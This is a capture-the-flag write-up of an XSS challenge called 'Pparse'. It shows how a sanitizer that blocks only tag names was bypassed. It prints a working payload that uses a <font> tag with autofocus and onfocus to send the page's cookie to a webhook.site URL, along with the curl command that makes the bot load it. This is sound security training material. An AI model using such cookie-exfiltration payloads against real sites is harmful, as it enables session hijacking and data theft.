# Pparse — Writeup (Web / XSS, Custom Parser Bypass)

## Challenge Info
- **Category:** Web / Cross-Site Scripting (XSS)
- **Target:** A web app with a custom HTML sanitizer/parser
- **Flag format:** `flag{...}`

## Step 0 — Understand the Challenge
The source code (`app.py`, `bot.py`) revealed key facts:
1. The parser only blacklists certain **tag names** — it never checks **attributes**. Also, the sanitized output is rendered without escaping. So any tag *not* on the blacklist passes through completely untouched, attributes and all.
2. There's a "mutation trap": if a tag starts with `<b`, it gets mutated into `<i` (e.g. `<body onload=...>` silently becomes `<iody onload=...>`, which is a non-existent tag, so `onload` never fires). This blocks the obvious payload.
3. A bot visits the page with a cookie containing the real flag. The cookie is **not** marked `httponly`, meaning JavaScript can read it. Importantly, **the bot does not click or type anything** — so the attack needs to trigger automatically with zero interaction.
4. There's a `/report` endpoint that makes the bot visit a URL, but only if the hostname is `127.0.0.1` or `localhost`.

The blacklist does **not** cover several tags like `font`, `h1`–`h6`, `center`, `tt`, `s`, `nobr`, `bdo` — these become the entry point.

## Step 1 — Set Up an Exfiltration Webhook
Used [webhook.site](https://webhook.site) to get a free, temporary URL that can receive and log HTTP requests:
```bash
curl -s -X POST https://webhook.site/token
```
This returns a unique ID, which becomes the webhook URL to send stolen data to.

## Step 2 — Craft the Payload
The goal: use an allowed tag with an event handler that fires automatically on page load (since the bot won't interact with anything), and have it send the cookie to our webhook.

```html
<font tabindex=1 autofocus onfocus="new Image().src='https://webhook.site/<uuid>?f='.concat(document.cookie)" onfocusin="new Image().src='https://webhook.site/<uuid>?g='.concat(document.cookie)">pwn
```

**How each part works:**

| Piece | Purpose |
|---|---|
| `<font ...>` | Not blacklisted, so it passes through untouched |
| `tabindex=1` | Makes a normally non-interactive element focusable |
| `autofocus` | Browser focuses the element immediately on page load |
| `onfocus` / `onfocusin` | Fires JavaScript the instant the element is focused — no clicking needed |
| `new Image().src=...` | Creates an invisible image request, sending data as part of the URL |
| `document.cookie` | The actual cookie value (which contains the flag) |

## Step 3 — Verify the Bypass First
Before involving the bot, it's important to paste the payload into the app and confirm the **parsed output still contains the full payload, unmodified**. This confirms the sanitizer was bypassed successfully — skipping this step risks wasting the bot's limited visits.

## Step 4 — Get the Bot to Visit the Payload
Used the `/report` endpoint to make the bot visit our payload, wrapped inside the allowed internal URL:
```bash
curl -s -X POST "http://<target>/report" \
  -d "url=http://127.0.0.1:8000/?html_input=<url-encoded payload>"
```
Important: the `url=` value must always point to `127.0.0.1` (the bot's internal address) — mixing in the external IP causes a cookie domain mismatch and the attack fails.

## Step 5 — Collect the Flag
Within a few seconds, requests started arriving at the webhook, each containing the stolen cookie in the query string:
```
query = {"g": "flag=flag{...}"}
```
The part after `flag=` is the actual flag.

## Automation
All of the steps above (create webhook → build payload → verify bypass → report to bot → poll webhook for the flag) were combined into a single Python script, so that if a new instance comes up (new port), only one line needs to change.

## Troubleshooting Notes
| Symptom | Cause | Fix |
|---|---|---|
| Webhook got a hit, but it's empty | The hit came from your own browser, not the bot | Don't open the payload yourself — only send it via `/report` |
| `Invalid host` error from `/report` | URL used something other than `127.0.0.1`/`localhost` | Always use `http://127.0.0.1:8000/...` |
| No hits on webhook at all | Instance expired, wrong bot URL, or old webhook | Restart challenge instance, generate a fresh webhook, repeat verification step |

## Lesson Learned
A sanitizer that only blocks tag *names* (and ignores attributes) is not safe — attackers just use a different, unblocked tag with the same dangerous attribute. Combined with auto-triggering attributes like `autofocus` + `onfocus`, this creates an XSS payload that requires **zero user interaction** — dangerous for any automated system (like a bot) that simply loads the page.
